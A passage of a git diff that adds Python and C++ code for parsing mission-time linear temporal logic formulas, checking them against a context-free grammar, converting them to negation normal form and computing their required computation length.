<= len_s-1):\n+                end_interval = end_interval + 1\n+\n+            alpha = Slice(s, 1, binary_conn_index-1)\n+            interval = Slice(s, begin_interval, end_interval)\n+            beta = Slice(s, end_interval+1, len_s-2)\n+            return Wff_check(alpha) and Interval_check(interval) and Wff_check(beta)\n+\n+    return False\n+\n+\n+# Returns the index of the primary binary connective of a WFF. \n+def primary_binary_conn(wff : str):\n+    len_wff = len(wff)\n+\n+    # '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+    if (Assoc_Prop_conn_check(Slice_char(wff, 1))):\n+        return 1\n+\n+    # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019  |  \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)'\n+    if (Slice_char(wff, 0) == \"(\" and Slice_char(wff, len_wff-1) == \")\"):\n+        left_count = 0\n+        right_count = 0\n+\n+        for binary_conn_index in Range(1, len_wff-1, 1):\n+            c = Slice_char(wff, binary_conn_index)\n+\n+            if(c == \"(\"):\n+                left_count += 1\n+\n+            if(c == \")\"):\n+                right_count += 1\n+\n+            if(left_count == right_count and (Binary_Prop_conn_check(c) or Binary_Temp_conn_check(c))):\n+                break\n+\n+        return binary_conn_index\n+\n+    else:\n+        error_string = wff + \" does not have a primary binary conn.\\n\"\n+        raise Exception(error_string)\n+\n+\n+\n+# Returns the indices where the primary interval is in a given WFF.\n+def primary_interval(wff : str):\n+    len_wff = len(wff)\n+\n+    # Unary_Temp_conn  Interval  Wff\n+    if (Unary_Temp_conn_check(Slice_char(wff, 0))):\n+        begin_interval = 1\n+\n+        # Parse for comma_index\n+        comma_index = begin_interval+1\n+        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1):\n+            comma_index += 1\n+\n+        # Parse for end_interval\n+        end_interval = comma_index+1\n+        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1):\n+            end_interval += 1\n+\n+        return (begin_interval, comma_index, end_interval)\n+\n+\n+    # \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n+    binary_conn_index = primary_binary_conn(wff)\n+    if (Binary_Temp_conn_check(Slice_char(wff, binary_conn_index))):\n+        begin_interval = binary_conn_index+1\n+\n+        # Parse for comma_index\n+        comma_index = begin_interval+1\n+        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1):\n+            comma_index += 1\n+\n+        # Parse for end_interval\n+        end_interval = comma_index+1\n+        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1):\n+            end_interval += 1\n+\n+        return (begin_interval, comma_index, end_interval)\n+\n+   \n+    else:\n+        error_string = wff + \" does not have a primary interval.\\n\"\n+        raise Exception(error_string)\n+\n+\n+\n+# Determines the minimum computation length needed for a given WFF to not have out-of-bounds behavior.\n+def Comp_len(wff : str):\n+    len_wff = len(wff)\n+\n+    # Prop_var\n+    if (Prop_var_check(wff)):\n+        return 1\n+\n+    # Prop_cons\n+    if (Prop_cons_check(wff)):\n+        return 0\n+\n+    c = Slice_char(wff, 0)\n+    # Unary_Prop_conn Wff\n+    if (Unary_Prop_conn_check(c)):\n+        alpha = Slice(wff, 1, len_wff-1)\n+        return Comp_len(alpha)\n+\n+    # Unary_Temp_conn  Interval  Wff\n+    if (Unary_Temp_conn_check(c)):\n+        interval = primary_interval(wff)\n+        comma_index = interval[1]\n+        end_interval = interval[2]\n+        upperbound = int(Slice(wff, comma_index+1, end_interval-1))\n+        alpha = Slice(wff, end_interval+1, len_wff-1)\n+        return upperbound + Comp_len(alpha) \n+\n+    # '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+    c = Slice_char(wff, 1)\n+    if (Assoc_Prop_conn_check(c)):\n+        # Parse through '[' wff_1 ',' wff_2 ',' ... ',' wff_n ']' entry-by-entry\n+        # and iteratively compute: return_value = max(Comp_len(wff_1), ..., Comp_len(wff_n))\n+        begin_entry = 3\n+        return_value = 0\n+        for end_entry in Range(3, len_wff-1, 1):\n+            if (Wff_check(Slice(wff, begin_entry, end_entry))):\n+                alpha = Slice(wff, begin_entry, end_entry)\n+                Comp1 = Comp_len(alpha)\n+\n+                # Take max of current return_value and Comp_len(alpha)\n+                if (return_value < Comp1):\n+                    return_value = Comp1\n+\n+                # Update begin_entry so it has index of the first char of the next entry.\n+                begin_entry = end_entry + 2\n+\n+        return return_value\n+\n+    # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019  |  \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)'\n+    binary_conn_index = primary_binary_conn(wff)\n+    binary_conn = Slice_char(wff, binary_conn_index)\n+\n+    # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n+    if (Binary_Prop_conn_check(binary_conn)):\n+        alpha = Slice(wff, 1, binary_conn_index-1) \n+        Comp_alpha = Comp_len(alpha)\n+        beta = Slice(wff, binary_conn_index+1, len_wff-2)\n+        Comp_beta = Comp_len(beta)\n+\n+        return max(Comp_alpha, Comp_beta)\n+\n+    # \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)'\n+    if (Binary_Temp_conn_check(binary_conn)):\n+        interval = primary_interval(wff)\n+        comma_index = interval[1]\n+        end_interval = interval[2]\n+        upper_bound = int(Slice(wff, comma_index + 1, end_interval - 1))\n+\n+        alpha = Slice(wff, 1, binary_conn_index-1)\n+        Comp_alpha = Comp_len(alpha) \n+        beta = Slice(wff, end_interval+1, len_wff-2)\n+        Comp_beta = Comp_len(beta)\n+        \n+        return max((upper_bound-1) + Comp_alpha, upper_bound + Comp_beta)\n+\n+    \n+    else:\n+        error_string = wff + \" is not a well-formed formula.\\n\"\n+        raise Exception(error_string)\n\\ No newline at end of file\ndiff --git a\/MLTL_brute_forcer\/Python\/nnf grammar.docx b\/MLTL_brute_forcer\/Python\/nnf grammar.docx\nnew file mode 100644\nindex 0000000..7a2632d\nBinary files \/dev\/null and b\/MLTL_brute_forcer\/Python\/nnf grammar.docx differ\ndiff --git a\/MLTL_brute_forcer\/Python\/nnf_grammar.cpp b\/MLTL_brute_forcer\/Python\/nnf_grammar.cpp\nnew file mode 100644\nindex 0000000..a79b54f\n--- \/dev\/null\n+++ b\/MLTL_brute_forcer\/Python\/nnf_grammar.cpp\n@@ -0,0 +1,451 @@\n+#include <string>\n+#include <tuple>\n+#include <stdexcept>\n+#include <iostream>\n+#include \"grammar.h\"\n+#include \"nnf_grammar.h\"\n+\n+\/*\n+Context-Free Grammar for a mLTL wff in Negation normal-form (Nnf):\n+Here, \u2018Eventually\u2019, \u2018Always\u2019, \u2018Until\u2019, and \u2018Release\u2019 are represented by the letters \u2018F\u2019, \u2018G\u2019, \u2018U\u2019, and \u2018R\u2019.\n+\n+Alphabet = { \u20180\u2019, \u20181\u2019, \u2026, \u20189\u2019, \u2018p\u2019, \u2018(\u2018, \u2018)\u2019, \u2018[\u2019, \u2018]\u2019, ':', \u2018,\u2019 ,\n+                       \u2018T\u2019, \u2018!\u2019,                \n+                       \u2018~\u2019, \u2018F\u2019, \u2018G\u2019,\n+                       \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019, \u2018U\u2019, \u2018R\u2019 }\n+\n+Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\n+Num  ->  Digit Num |  Digit\n+Interval  ->  \u2018[\u2019  Num \u2018:\u2019 Num \u2018]\u2019  \n+Prop_var  ->  \u2018p\u2019 Num\n+\n+Prop_cons  ->  \u2018T\u2019 | \u2018!\u2019\n+Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n+\n+Assoc_Prop_conn -> \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019\n+Nnf_Array_entry -> Nnf \u2018,\u2019 Nnf_Array_entry  |  Nnf \n+\n+Unary_Temp_conn  ->  \u2018F\u2019 | \u2018G\u2019\n+Binary_Temp_conn  ->  \u2018U\u2019 | \u2018R\u2019\n+\n+Nnf ->  ?('~')  Prop_var | Prop_cons\n+\t                   | Unary_Temp_conn  Interval  Nnf\n+\n+\t                   | '(' Assoc_Prop_conn \u2018[\u2018 Nnf_Array_entry \u2018]\u2019 ')'\n+                       | \u2018(\u2018 Nnf Binary_Prop_conn Nnf \u2018)\u2019\n+                       | \u2018(\u2018 Nnf Binary_Temp_conn  Interval Nnf  \u2018)\u2019\n+\n+*\/\n+\n+using namespace std;\n+\n+\n+\/*\n+ * Nnf_Array_entry -> Nnf \u2018,\u2019 Nnf_Array_entry  |  Nnf\n+ * Checks that an inputted string is an array of formulas in NNF.\n+ *\/\n+bool Nnf_Array_entry_check(string s){\n+    int len_s = int(s.length());\n+\n+    \/\/ Number of '(' in s\n+    int left_count = 0;\n+    \/\/ Number of ')' in s\n+    int right_count = 0;\n+\n+\n+    \/\/    Parse for comma_index in s\n+    \/\/    When left_count == right_count, we are done parsing and have found comma_index.\n+    int comma_index = 0;\n+    for (comma_index = 0; comma_index <= len_s-1; ++comma_index){\n+\n+        string c = Slice_char(s, comma_index);\n+\n+        if (c == \"(\") {\n+            ++left_count;\n+        }\n+        else if (c == \")\"){\n+            ++right_count;\n+        }\n+\n+        \/\/ Done parsing for comma_index.\n+        if (left_count == right_count and c == \",\"){\n+            break;\n+        }\n+    }\n+\n+    return (Nnf_check(Slice(s, 0, comma_index-1)) and Slice_char(s, comma_index) == \",\" \n+        and Nnf_Array_entry_check(Slice(s, comma_index+1, len_s-1))) or Nnf_check(s) ;\n+}\n+\n+\n+\/*\n+ *  Nnf ->   ?('~') Prop_var | Prop_cons\n+ *          | Unary_Temp_conn  Interval  Nnf\n+ *          | '(' Assoc_Prop_conn \u2018[\u2018 Nnf_Array_entry \u2018]\u2019 ')'\n+ *          | \u2018(\u2018 Nnf Binary_Prop_conn Nnf \u2018)\u2019\n+ *          | \u2018(\u2018 Nnf Binary_Temp_conn  Interval Nnf  \u2018)\u2019\n+ * Checks that the inputted string is a WWF in NNF.\n+ *\/\n+bool Nnf_check(string s){\n+    int len_s = int(s.length());\n+\n+    \/\/ ?('~') Prop_var | Prop_cons\n+    if (Prop_var_check(s) or (Slice_char(s,0) == \"~\" and Prop_var_check(Slice(s, 1, len_s-1))) \n+                          or Prop_cons_check(s)){\n+        return true;\n+    }  \n+\n+    \/\/ Unary_Temp_conn  Interval  Nnf\n+    if (Unary_Temp_conn_check(Slice_char(s, 0))){\n+        int begin_interval = 1;\n+        int end_interval = 2;\n+\n+        \/\/ Parse for end of interval\n+        while (Slice_char(s, end_interval) != \"]\" and end_interval <= len_s-1){\n+            end_interval = end_interval + 1;\n+        }\n+\n+        string interval = Slice(s, begin_interval, end_interval);\n+        string alpha = Slice(s, end_interval+1, len_s-1);\n+        return Interval_check(interval) and Nnf_check(alpha);\n+    }\n+\n+    \/\/ '(' Assoc_Prop_conn \u2018[\u2018 Nnf_Array_entry \u2018]\u2019 ')'\n+    if(Assoc_Prop_conn_check(Slice_char(s, 1))){\n+        int begin_array = 2;\n+        int end_array = len_s-2;\n+\n+        string array_entry = Slice(s, begin_array+1, end_array-1);\n+        return Slice_char(s, 0) == \"(\" \n+            and Slice_char(s, 2) == \"[\"\n+            and Nnf_Array_entry_check(array_entry)\n+            and Slice_char(s, len_s - 2) == \"]\"\n+            and Slice_char(s, len_s - 1) == \")\"; \n+    }\n+\n+\/\/    \u2018(\u2018 Nnf Binary_Prop_conn Nnf \u2018)\u2019 | \u2018(\u2018 Nnf Binary_Temp_conn  Interval Nnf  \u2018)\u2019\n+    if (Slice_char(s, 0) == \"(\" and Slice_char(s, len_s-1) == \")\"){\n+\n+        \/\/ Number of '(' in s\n+        int left_count = 0;\n+        \/\/ Number of ')' in s\n+        int right_count = 0;\n+\n+\n+        \/\/    Parse for binary_conn_index in s\n+\n+        \/\/    When left_count == right_count and s[binary_conn_index] is a binary connective,\n+        \/\/    we are done parsing and have found binary_conn_index.\n+\n+        int binary_conn_index = 1;\n+        for (binary_conn_index = 1; binary_conn_index <= len_s-1; ++binary_conn_index){\n+            string c = Slice_char(s, binary_conn_index);\n+\n+            if(c == \"(\"){\n+                ++left_count;\n+            }\n+\n+            if(c == \")\"){\n+                ++right_count;\n+            }\n+\n+            \/\/ Done parsing for binary_conn_index.\n+            if(left_count == right_count and (Binary_Prop_conn_check(c) or Binary_Temp_conn_check(c))){\n+                break;\n+            }\n+        }\n+\n+        string binary_conn = Slice_char(s, binary_conn_index);\n+\n+        \/\/ \u2018(\u2018 Nnf Binary_Prop_conn Nnf \u2018)\u2019\n+        if (Binary_Prop_conn_check(binary_conn)){\n+            string alpha = Slice(s, 1, binary_conn_index-1);\n+            string beta = Slice(s, binary_conn_index+1, len_s-2);\n+            return Nnf_check(alpha) and Nnf_check(beta);\n+        }\n+\n+        \/\/ \u2018(\u2018 Nnf Binary_Temp_conn  Interval Nnf  \u2018)\u2019\n+        if (Binary_Temp_conn_check(binary_conn)){\n+            int begin_interval = binary_conn_index+1;\n+            int end_interval = binary_conn_index+2;\n+\n+            \/\/ Parse for end of interval\n+            while (Slice_char(s, end_interval) != \"]\" and end_interval <= len_s-1){\n+                end_interval = end_interval + 1;\n+            }\n+\n+            string alpha = Slice(s, 1, binary_conn_index-1);\n+            string interval = Slice(s, begin_interval, end_interval);\n+            string beta = Slice(s, end_interval+1, len_s-2);\n+            return Nnf_check(alpha) and Interval_check(interval) and Nnf_check(beta);\n+        }\n+    }\n+\n+    return false;\n+}\n+\n+\n+\/*\n+ * Converts a WFF to its equivalent NNF.\n+ * A cleaner implementation of Wff_to_Nnf().\n+ *\/\n+string Wff_to_Nnf_clean(string wff){\n+    int len_wff = int(wff.length());\n+\n+    \/\/Determine if first symbol is '~' or not.\n+    if (Slice_char(wff, 0) != \"~\"){\n+        \/\/ Prop_var\n+        if (Prop_var_check(wff)){\n+            return wff;\n+        }\n+\n+        \/\/ Prop_cons\n+        if (Prop_cons_check(wff)){\n+            return wff;\n+        }\n+\n+        \/\/ Unary_Temp_conn Interval wff\n+        if (Unary_Temp_conn_check(Slice_char(wff, 0))){\n+            string unary_temp_conn = Slice_char(wff, 0);\n+            tuple<int, int, int> interval_tuple = primary_interval(wff);\n+            int begin_interval = get<0>(interval_tuple); \n+            int end_interval =  get<2>(interval_tuple);\n+            string alpha = Slice(wff, end_interval+1, len_wff-1);\n+\n+            \/\/ Input: unary_temp_conn Interval alpha\n+            \/\/ Return: unary_temp_conn Interval Wff_to_Nnf_clean(alpha)\n+            return unary_temp_conn + Slice(wff, begin_interval, end_interval) + Wff_to_Nnf_clean(alpha);\n+        } \n+\n+        \/\/ '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+        if (Assoc_Prop_conn_check(Slice_char(wff, 1))){\n+            \/\/ Parse through '[' wff_1 ',' wff_2 ',' ... ',' wff_n ']' entry-by-entry\n+            \/\/ and iteratively compute: return_string = '(' Assoc_Prop_conn '[' Wff_to_Nnf_clean(wff_1) ',' ... ',' Wff_to_Nnf_clean(wff_n) ']' ')'\n+            int begin_entry = 3;\n+            string return_string = Slice(wff, 0, 2); \n+            for (int end_entry = 3; end_entry <= len_wff-1; ++end_entry){\n+                if (Wff_check(Slice(wff, begin_entry, end_entry))){\n+                    string alpha = Slice(wff, begin_entry, end_entry);\n+                    \n+                    \/\/ Add Wff_to_Nnf_clean(alpha) to return string\n+                    return_string = return_string + Wff_to_Nnf_clean(alpha) + \",\";\n+\n+                    \/\/ Update begin_entry so it has index of the first char of the next entry.\n+                    begin_entry = end_entry + 2;\n+                }\n+            }\n+\n+            \/\/ Remove extra comma at right end\n+            return_string = Slice(return_string, 0, int(return_string.length()-2));\n+\n+            \/\/ Input: '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+            \/\/ Return: '(' Assoc_Prop_conn '[' Wff_to_Nnf_clean(wff_1) ',' ... ',' Wff_to_Nnf_clean(wff_n) ']' ')'\n+            return_string = return_string + \"])\";\n+            return return_string;\n+        }\n+\n+        \/\/ \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)    \n+        int binary_conn_index = primary_binary_conn(wff);\n+        string binary_conn = Slice_char(wff, binary_conn_index);\n+\n+        \/\/ \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n+        if (Binary_Prop_conn_check(binary_conn)){\n+            string alpha = Slice(wff, 1, binary_conn_index-1);\n+            string beta = Slice(wff, binary_conn_index+1, len_wff-2);\n+\n+            \/\/ Input: '(' alpha binary_conn beta ')' \n+            \/\/ Return: '(' Wff_to_Nnf_clean(alpha) + binary_conn + Wff_to_Nnf_clean(beta)\n+            return \"(\" + Wff_to_Nnf_clean(alpha) + binary_conn + Wff_to_Nnf_clean(beta) + \")\";\n+        }\n+\n+        \/\/ \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)'\n+        if (Binary_Temp_conn_check(binary_conn)){\n+            tuple<int, int, int> interval_tuple = primary_interval(wff);\n+            int begin_interval = get<0>(interval_tuple);\n+            int end_interval = get<2>(interval_tuple);\n+\n+            string alpha = Slice(wff, 1, binary_conn_index-1);\n+            string beta = Slice(wff, end_interval+1, len_wff-2);\n+\n+            \/\/ Input: \u2018(\u2018 alpha binary_conn  Interval beta \u2018)'  \n+            \/\/ Return: '(' Wff_to_Nnf_clean(alpha) binary_conn Interval Wff_to_Nnf_clean(beta) ')'\n+            return \"(\" + Wff_to_Nnf_clean(alpha) + binary_conn \n+                + Slice(wff, begin_interval, end_interval) + Wff_to_Nnf_clean(beta) + \")\";\n+        }    \n+        \n+    }\n+\n+    \/\/ Slice_char(wff, 0) == \"~\"\n+    if (Slice_char(wff, 0) == \"~\"){\n+        \/\/ '~' Prop_var\n+        if (Prop_var_check(Slice(wff, 1, len_wff-1))){\n+            return wff;\n+        }\n+\n+        \/\/ '~' Prop_cons\n+        if (Prop_cons_check(Slice(wff, 1, len_wff-1))){\n+            \/\/ Prop_cons -> 'T'\n+            if (Slice(wff, 1, len_wff-1) == \"T\"){\n+                return \"!\";\n+            }\n+\n+            \/\/ Prop_cons -> '!'\n+            if (Slice(wff, 1, len_wff-1) == \"!\"){\n+                return \"T\";\n+            }\n+        }\n+\n+        \/\/ '~' Unary_Prop_conn Wff\n+        if (Unary_Prop_conn_check(Slice_char(wff, 1))){\n+            string alpha = Slice(wff, 2, len_wff-1);\n+            return Wff_to_Nnf_clean(alpha);\n+        }\n+\n+        \/\/ '~' Unary_Temp_conn  Interval  Wff\n+        if (Unary_Temp_conn_check(Slice_char(wff, 1))){\n+            string unary_temp_conn = Slice_char(wff, 1);\n+\n+            tuple<int, int, int> interval_tuple = primary_interval(Slice(wff, 1, len_wff-1));\n+            \/\/ Add 1 to every entry of interval tuple to accomodate sliced-off '~' char.\n+            interval_tuple = make_tuple(get<0>(interval_tuple) + 1, get<1>(interval_tuple) + 1, get<2>(interval_tuple) + 1);\n+\n+            int begin_interval = get<0>(interval_tuple);\n+            int end_interval = get<2>(interval_tuple);\n+            string alpha =  Slice(wff, end_interval+1, len_wff-1);\n+\n+            \/\/ Switch 'F', 'G' with corresponding dual: 'G', 'F'\n+            if (unary_temp_conn == \"F\"){\n+                unary_temp_conn = \"G\";\n+            }\n+            else if (unary_temp_conn == \"G\"){\n+                unary_temp_conn = \"F\";\n+            }  \n+\n+            \/\/ Input: '~' unary_Temp_conn  Interval  alpha \n+            \/\/ Return: dual(unary_Temp_conn) Interval Wff_to_Nnf_clean(\"~\" + alpha)\n+            return unary_temp_conn + Slice(wff, begin_interval, end_interval) + Wff_to_Nnf_clean(\"~\" + alpha);\n+        }\n+\n+        \/\/ '~' \u2018(\u2018 Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 \u2018)\u2019\n+        if (Assoc_Prop_conn_check(Slice_char(wff, 2))){\n+            string assoc_prop_conn = Slice_char(wff, 2);\n+\n+            \/\/ ~ (...((wff_1 assoc_prop_conn wff_2) assoc_prop_conn wff_3) ... assoc_prop_conn wff_n)\n+            \/\/ is equiv to ~(assoc_prop_conn [wff_1, ..., wff_n])\n+            int begin_entry = 4;\n+            string equiv_formula = \"\"; \n+            for (int end_entry = 4; end_entry <= len_wff-1; ++end_entry){\n+                if (Wff_check(Slice(wff, begin_entry, end_entry))){   \n+                    string alpha = Slice(wff, begin_entry, end_entry);\n+                    \n+                    \/\/ First entry obtained\n+                    if (begin_entry == 4){\n+                        \/\/ Add wff_1 to equiv_formula\n+                        equiv_formula = equiv_formula + alpha;\n+                    }\n+\n+                    \/\/ Not first entry\n+                    else {\n+                        \/\/ Add wff_n to equiv_formula, where n >= 2\n+                        equiv_formula = \"(\" + equiv_formula + assoc_prop_conn + alpha + \")\";\n+                    }\n+\n+                    \/\/ Update begin_entry so it has index of the first char of the next entry.\n+                    begin_entry = end_entry + 2;\n+                }\n+            }\n+\n+            \/\/ Add on \"~\" on front\n+            equiv_formula = \"~\" + equiv_formula;\n+            \n+            \n+            return Wff_to_Nnf_clean(equiv_formula);\n+        }\n+\n+        \/\/ '~' \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | '~' \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)\n+\n+        \/\/ Add 1 to accomodate for sliced-off '~'    \n+        int binary_conn_index = primary_binary_conn(Slice(wff, 1, len_wff-1)) + 1;\n+        string binary_conn = Slice_char(wff, binary_conn_index);\n+\n+        \/\/ '~' \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n+        if (Binary_Prop_conn_check(binary_conn)){\n+            \/\/ '~' \u2018(\u2018 Wff 'v' Wff \u2018)\u2019 | '~' \u2018(\u2018 Wff '&' Wff \u2018)\n+            if (binary_conn == \"v\" or binary_conn == \"&\"){ \n+\n+                \/\/ Switch 'v', '&' with corresponding dual: '&', 'v'\n+                if (binary_conn == \"v\"){\n+                    binary_conn = \"&\";\n+                }\n+                else if (binary_conn == \"&\"){\n+                    binary_conn = \"v\";\n+                } \n+\n+                string nega_alpha = \"~\" + Slice(wff, 2, binary_conn_index-1);\n+                string nega_beta = \"~\" + Slice(wff, binary_conn_index+1, len_wff-2);\n+                return \"(\" + Wff_to_Nnf_clean(nega_alpha) + binary_conn + Wff_to_Nnf_clean(nega_beta) + \")\";\n+            }\n+\n+            \/\/ '~' \u2018(\u2018 Wff '=' Wff ')'\n+            if (binary_conn == \"=\"){\n+                string alpha = Slice(wff, 2, binary_conn_index-1);\n+                string beta = Slice(wff, binary_conn_index+1, len_wff-2);\n+                string nega_alpha = \"~\" + alpha;\n+                string nega_beta = \"~\" + beta;\n+\n+                \/\/ Input: '~' \u2018(\u2018 alpha '=' beta ')'\n+                \/\/ Return: \"((\" + Wff_to_Nnf_clean(alpha) + \"v\" + Wff_to_Nnf_clean(beta) \")\"\n+                \/\/ + \"&\" + \"(\" \"Wff_to_Nnf_clean(neg_alpha)\" + \"v\" + \"Wff_to_Nnf_clean(neg_beta)\" \"))\"\n+                return \"((\" + Wff_to_Nnf_clean(alpha) + \"v\" + Wff_to_Nnf_clean(beta) + \")\" \n+                    + \"&\" + \"(\" + Wff_to_Nnf_clean(nega_alpha) + \"v\" + Wff_to_Nnf_clean(nega_beta) + \"))\";\n+            }\n+\n+            \/\/ '~' '(' Wff '>' Wff ')'\n+            if (binary_conn == \">\"){\n+                string alpha = Slice(wff, 2, binary_conn_index-1);\n+                string beta = Slice(wff, binary_conn_index+1, len_wff-2);\n+                string neg_beta = \"~\" + beta;\n+\n+                \/\/ Input: \"~(\" + alpha + \">\" + beta \")\"\n+                \/\/ Return: \"(\" + Wff_to_Nnf_clean(alpha) + \"&\" + Wff_to_Nnf_clean(neg_beta) + \")\"\n+                return \"(\" + Wff_to_Nnf_clean(alpha) + \"&\" + Wff_to_Nnf_clean(neg_beta) + \")\";\n+            }\n+\n+        }\n+\n+\n+        \/\/'~' \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)\n+        if (Binary_Temp_conn_check(binary_conn)){\n+            tuple<int, int, int> interval_tuple = primary_interval(Slice(wff, 1, len_wff-1));\n+            \/\/ Add 1 to accomodate for sliced-off '~' \n+            int start_interval = get<0>(interval_tuple) + 1;\n+            int end_interval = get<2>(interval_tuple) + 1;\n+            if (binary_conn == \"U\" or binary_conn == \"R\"){ \n+                \n+                \/\/ Binary_Temp_conn -> \u2018U\u2019 | \u2018R\u2019\n+                \/\/ Switch 'U', 'R' with corresponding dual: 'R', 'U'\n+                if (binary_conn == \"U\"){\n+                    binary_conn = \"R\";\n+                }\n+                else if (binary_conn == \"R\"){\n+                    binary_conn = \"U\";\n+                } \n+\n+                string neg_alpha = \"~\" + Slice(wff, 2, binary_conn_index-1);\n+                string neg_beta = \"~\" + Slice(wff, end_interval+1, len_wff-2);\n+\n+                \/\/ Input: \"~(\" + alpha + binary_conn + beta + \")\"\n+                \/\/Return: \"(\" + Wff_to_Nnf_clean(neg_alpha) + dual(binary_conn) \n+                \/\/          + interval + Wff_to_Nnf_clean(neg_beta) + \")\"\n+                return \"(\" + Wff_to_Nnf_clean(neg_alpha) + binary_conn\n+                    + Slice(wff, start_interval, end_interval) + Wff_to_Nnf_clean(neg_beta) + \")\";\n+            }\n+        }\n+    }\n+\n+    else{\n+        string error_string = wff + \" is not a well-formed formula.\\n\";\n+        throw invalid_argument(error_string);\n+    }\n+    return \"\";\n+}\ndiff --git a\/MLTL_brute_forcer\/Python\/nnf_grammar.py b\/MLTL_brute_forcer\/Python\/nnf_grammar.py\nnew file mode 100644\nindex 0000000..0ea2ee2\n--- \/dev\/null\n+++ b\/MLTL_brute_forcer\/Python\/nnf_grammar.py\n@@ -0,0 +1,379 @@\n+from grammar import *\n+\n+\n+# Context-Free Grammar for a mLTL wff in Negation normal-form (Nnf):\n+# Here, \u2018Eventually\u2019, \u2018Always\u2019, \u2018Until\u2019, and \u2018Release\u2019 are represented by the letters \u2018F\u2019, \u2018G\u2019, \u2018U\u2019, and \u2018R\u2019.\n+\n+# Alphabet = { \u20180\u2019, \u20181\u2019, \u2026, \u20189\u2019, \u2018p\u2019, \u2018(\u2018, \u2018)\u2019, \u2018[\u2019, \u2018]\u2019, ':', \u2018,\u2019 ,\n+#                        \u2018T\u2019, \u2018!\u2019,                \n+#                        \u2018~\u2019, \u2018F\u2019, \u2018G\u2019,\n+#                        \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019, \u2018U\u2019, \u2018R\u2019 }\n+\n+# Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\n+# Num  ->  Digit Num |  Digit\n+# Interval  ->  \u2018[\u2019  Num \u2018:\u2019 Num \u2018]\u2019  \n+# Prop_var  ->  \u2018p\u2019 Num\n+\n+# Prop_cons  ->  \u2018T\u2019 | \u2018!\u2019\n+# Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n+\n+# Assoc_Prop_conn -> \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019\n+# Nnf_Array_entry -> Nnf \u2018,\u2019 Nnf_Array_entry  |  Nnf \n+\n+# Unary_Temp_conn  ->  \u2018F\u2019 | \u2018G\u2019\n+# Binary_Temp_conn  ->  \u2018U\u2019 | \u2018R\u2019\n+\n+# Nnf ->  ?('~')  Prop_var | Prop_cons\n+# \t                   | Unary_Temp_conn  Interval  Nnf\n+\n+# \t                   | '(' Assoc_Prop_conn \u2018[\u2018 Nnf_Array_entry \u2018]\u2019 ')'\n+#                        | \u2018(\u2018 Nnf Binary_Prop_conn Nnf \u2018)\u2019\n+#                        | \u2018(\u2018 Nnf Binary_Temp_conn  Interval Nnf  \u2018)\u2019\n+\n+\n+\n+# Nnf_Array_entry -> Nnf \u2018,\u2019 Nnf_Array_entry  |  Nnf\n+# Checks that an inputted string is an array of formulas in NNF.\n+def Nnf_Array_entry_check(s : str):\n+    len_s = len(s)\n+\n+    # Number of '(' in s\n+    left_count = 0\n+    # Number of ')' in s\n+    right_count = 0\n+\n+\n+    #    Parse for comma_index in s\n+    #    When left_count == right_count, we are done parsing and have found comma_index.\n+    for comma_index in Range(0, len_s-1, 1):\n+        c = Slice_char(s, comma_index)\n+\n+        if (c == \"(\"):\n+            left_count += 1\n+\n+        elif (c == \")\"):\n+            right_count += 1\n+\n+        # Done parsing for comma_index.\n+        if (left_count == right_count and c == \",\"):\n+            break\n+        \n+\n+    return (Nnf_check(Slice(s, 0, comma_index-1)) and Slice_char(s, comma_index) == \",\" \\\n+        and Nnf_Array_entry_check(Slice(s, comma_index+1, len_s-1))) or Nnf_check(s)\n+\n+\n+\n+#    Nnf ->   ?('~') Prop_var | Prop_cons\n+#            | Unary_Temp_conn  Interval  Nnf\n+#            | '(' Assoc_Prop_conn \u2018[\u2018 Nnf_Array_entry \u2018]\u2019 ')'\n+#            | \u2018(\u2018 Nnf Binary_Prop_conn Nnf \u2018)\u2019\n+#            | \u2018(\u2018 Nnf Binary_Temp_conn  Interval Nnf  \u2018)\u2019\n+#   Checks that the inputted string is a WWF in NNF.\n+ \n+def Nnf_check(s : str):\n+    len_s = len(s)\n+\n+    # ?('~') Prop_var | Prop_cons\n+    if (Prop_var_check(s) or (Slice_char(s,0) == \"~\" and Prop_var_check(Slice(s, 1, len_s-1))) \n+                          or Prop_cons_check(s)):\n+        return True\n+\n+    # Unary_Temp_conn  Interval  Nnf\n+    if (Unary_Temp_conn_check(Slice_char(s, 0))):\n+        begin_interval = 1\n+        end_interval = 2\n+\n+        # Parse for end of interval\n+        while (Slice_char(s, end_interval) != 